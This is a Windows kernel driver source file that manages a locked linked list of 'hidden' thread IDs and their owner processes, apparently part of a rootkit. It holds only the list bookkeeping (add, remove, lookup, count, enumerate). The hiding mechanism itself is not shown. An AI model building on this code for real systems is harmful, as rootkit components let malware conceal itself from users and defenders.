#include "..\..\includes\shared.h"
#include "..\..\includes\thread_defs.h"

LIST_ENTRY g_thread_list;
KSPIN_LOCK g_thread_lock;

void thread_init(void)
{
    InitializeListHead(&g_thread_list);
    KeInitializeSpinLock(&g_thread_lock);
}

void thread_cleanup(void)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_thread_entry te;

    KeAcquireSpinLock(&g_thread_lock, &irql);
    while (!IsListEmpty(&g_thread_list)) {
        entry = RemoveHeadList(&g_thread_list);
        te = CONTAINING_RECORD(entry, hidden_thread_entry, list);
        ExFreePool(te);
    }
    KeReleaseSpinLock(&g_thread_lock, irql);
}

NTSTATUS thread_add(ULONG tid, ULONG owner_pid)
{
    phidden_thread_entry te;
    KIRQL irql;

    te = (phidden_thread_entry)ExAllocatePoolWithTag(NonPagedPool, sizeof(hidden_thread_entry), 'thch');
    if (!te) return STATUS_INSUFFICIENT_RESOURCES;
    te->tid = tid;
    te->owner_pid = owner_pid;
    KeAcquireSpinLock(&g_thread_lock, &irql);
    InsertTailList(&g_thread_list, &te->list);
    KeReleaseSpinLock(&g_thread_lock, irql);
    return STATUS_SUCCESS;
}

NTSTATUS thread_remove(ULONG tid)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_thread_entry te;

    KeAcquireSpinLock(&g_thread_lock, &irql);
    for (entry = g_thread_list.Flink; entry != &g_thread_list; entry = entry->Flink) {
        te = CONTAINING_RECORD(entry, hidden_thread_entry, list);
        if (te->tid == tid) {
            RemoveEntryList(&te->list);
            KeReleaseSpinLock(&g_thread_lock, irql);
            ExFreePool(te);
            return STATUS_SUCCESS;
        }
    }
    KeReleaseSpinLock(&g_thread_lock, irql);
    return STATUS_NOT_FOUND;
}

BOOLEAN thread_is_hidden(ULONG tid)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_thread_entry te;
    BOOLEAN found = FALSE;

    KeAcquireSpinLock(&g_thread_lock, &irql);
    for (entry = g_thread_list.Flink; entry != &g_thread_list; entry = entry->Flink) {
        te = CONTAINING_RECORD(entry, hidden_thread_entry, list);
        if (te->tid == tid) {
            found = TRUE;
            break;
        }
    }
    KeReleaseSpinLock(&g_thread_lock, irql);
    return found;
}

ULONG thread_count(void)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    ULONG count = 0;

    KeAcquireSpinLock(&g_thread_lock, &irql);
    for (entry = g_thread_list.Flink; entry != &g_thread_list; entry = entry->Flink)
        count++;
    KeReleaseSpinLock(&g_thread_lock, irql);
    return count;
}

NTSTATUS thread_list(PVOID buffer, ULONG size, PULONG needed)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_thread_entry te;
    pthread_request tr = (pthread_request)buffer;
    ULONG count = 0;

    *needed = thread_count() * sizeof(thread_request);
    if (size < *needed) return STATUS_BUFFER_TOO_SMALL;
    KeAcquireSpinLock(&g_thread_lock, &irql);
    for (entry = g_thread_list.Flink; entry != &g_thread_list; entry = entry->Flink) {
        te = CONTAINING_RECORD(entry, hidden_thread_entry, list);
        tr[count].tid = te->tid;
        tr[count].owner_pid = te->owner_pid;
        count++;
    }
    KeReleaseSpinLock(&g_thread_lock, irql);
    return STATUS_SUCCESS;
}
